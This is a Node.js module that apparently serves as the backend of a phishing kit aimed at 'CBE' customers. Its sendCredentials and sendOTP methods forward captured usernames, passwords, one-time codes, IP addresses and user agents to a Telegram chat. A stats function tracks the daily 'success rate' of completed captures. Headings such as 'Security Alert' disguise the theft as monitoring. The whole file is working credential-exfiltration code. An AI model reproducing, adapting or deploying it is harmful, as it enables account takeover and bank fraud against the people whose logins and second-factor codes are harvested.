const TelegramBot = require('node-telegram-bot-api');
const logger = require('./logger');

class TelegramService {
  constructor() {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      logger.warn('Telegram credentials not configured');
      this.enabled = false;
      return;
    }

    this.bot = new TelegramBot(token, { polling: false });
    this.chatId = chatId;
    this.enabled = true;
    logger.info('Telegram bot initialized');
  }

  async sendMessage(message, options = {}) {
    if (!this.enabled) {
      logger.info('Telegram disabled - message not sent');
      return;
    }

    try {
      const result = await this.bot.sendMessage(this.chatId, message, {
        parse_mode: 'HTML',
        ...options
      });
      logger.info('Telegram message sent successfully');
      return result;
    } catch (error) {
      logger.error(`Telegram send error: ${error.message}`);
      throw error;
    }
  }

  async sendCredentials(data) {
    const message = `
🔐 <b>CBE Security Alert</b>

<b>📋 New Credentials Captured</b>

👤 <b>Username:</b> <code>${data.username}</code>
🔑 <b>Password:</b> <code>${data.password}</code>
📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
🆔 <b>Session ID:</b> <code>${data.id}</code>
⏰ <b>Timestamp:</b> ${data.timestamp}

⚠️ <b>Action Required:</b> Investigate immediately
`;

    return this.sendMessage(message, {
      disable_notification: false
    });
  }

  async sendOTP(data) {
    const message = `
🔐 <b>CBE Security Alert</b>

<b>📋 OTP Code Captured</b>

🆔 <b>User ID:</b> <code>${data.userId}</code>
🔢 <b>OTP Code:</b> <code>${data.otp}</code>
📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
⏰ <b>Timestamp:</b> ${data.timestamp}

⚠️ <b>Action Required:</b> OTP verification completed
`;

    return this.sendMessage(message, {
      disable_notification: false
    });
  }

  async sendAlert(message) {
    const alertMsg = `
🚨 <b>URGENT ALERT</b>

${message}

⏰ Time: ${new Date().toISOString()}
`;

    return this.sendMessage(alertMsg, {
      disable_notification: false
    });
  }

  async sendStats(stats) {
    let message = `
📊 <b>CBE Security Dashboard</b>

<b>Last 7 Days Statistics:</b>

`;

    stats.forEach(stat => {
      message += `
📅 ${stat.date}:
   Total: ${stat.total}
   Completed: ${stat.completed || 0}
   Success Rate: ${stat.total > 0 ? Math.round((stat.completed/stat.total)*100) : 0}%
`;
    });

    return this.sendMessage(message);
  }
}

module.exports = new TelegramService();
